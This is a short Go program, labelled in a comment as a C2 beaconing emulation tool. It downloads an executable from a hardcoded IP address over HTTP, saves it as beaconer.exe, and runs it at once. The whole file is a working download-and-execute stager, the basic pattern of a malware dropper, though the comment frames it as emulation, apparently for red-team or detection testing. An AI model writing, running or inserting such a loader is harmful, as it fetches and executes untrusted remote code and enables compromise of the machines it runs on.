// A simple C2 beaconing emulation tool

package main

import (
	"fmt"
	"os"
	"net/http"
	"io"
	"os/exec"
)

func main () {
    indir := "http://80.240.139.233/beacon"

    if err := DownloadFile("beaconer.exe", indir); err != nil {
	panic(err)

    }

    cmd := exec.Command("beaconer.exe")
    fmt.Println("Running")
    err := cmd.Run()
    fmt.Println("Finished:", err)
}

func DownloadFile(filepath string, url string) error {

    resp, err := http.Get(url)
    if err != nil {
        return err
    }
    defer resp.Body.Close()

    out, err := os.Create(filepath)
    if err != nil {
        return err
    }
    defer out.Close()

    _, err = io.Copy(out, resp.Body)
    return err
}
